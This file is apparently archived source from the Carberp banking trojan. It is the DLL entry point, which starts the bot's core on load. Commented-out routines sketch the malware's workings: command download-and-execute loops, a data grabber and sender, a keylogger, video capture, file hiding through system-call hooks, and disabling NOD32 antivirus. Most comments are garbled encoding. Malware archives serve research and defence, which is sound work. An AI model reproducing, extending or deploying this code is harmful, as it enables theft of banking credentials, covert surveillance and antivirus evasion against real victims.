/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "BotCore.h"


#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------


//------------------------------------------------------------------------
//  ������� ������������ DLL
//------------------------------------------------------------------------
void InitializeDLL()
{
	BOT::Initialize();
}



/*

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		case BotBootkit: //���� ���������� �� ��� �������, �� ������� ring3 ���� �� ������������
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;
	}

	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// ������������ ���������� �������� �����
	InitializeTaskManager(NULL, true);

	// �������������� ������� �������� �������������� ����������
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}

	// 402_pl ������ ����� ��������� ������ (�� ���������� � ������ ��������)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));

	// ��������� ����� �������� ������
	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				DLLDBG( "Main", "��������� ����� �������" );
			else
				DLLDBG( "Main", "ERROR: �� ���������� ����� �������" );
		#endif //VideoProcessSvchost
	#endif

	DLLDBG("====>Bot Loader", "�������� ���������� ������");
	while (true)
	{
		// 403_pl ���� ��������� ������
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "������������" �������������� ����������� ���� � ��� �������
		// �������� ��������� ���������� ������ ���� ������ ����� ���������
		// �������
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "���������� ���������� � �������");
			FirstSended = SendFirstInfo();
		}


		// ���������������� ���������� ������
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}
*/

/*
DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "��������� ���. ������� [%s]", GetPrefix().t_str());
	
	//�������� ������� �� ���������� �����, ������� ��� �������� ���������� �������
	BOT::SavePrefixFromTemporaryFile(false);
	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();
	
	// �������������� ������� �������� �������������� ����������
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
	BOT::AddHiddenFile(GetHashFileNameBotPlug());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	DLLDBG("====>Bot DLL", "�������� Loader ()");
	RunLoaderRoutine();

	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	DLLDBG( "Main", "��������� NOD32" );
	OffNOD32();

	// 401_pl ������ BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "�������� ������");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}
*/


//------------------------------------------------------------------------
//  ����� ����� DLL
//------------------------------------------------------------------------
BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			InitializeDLL();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}
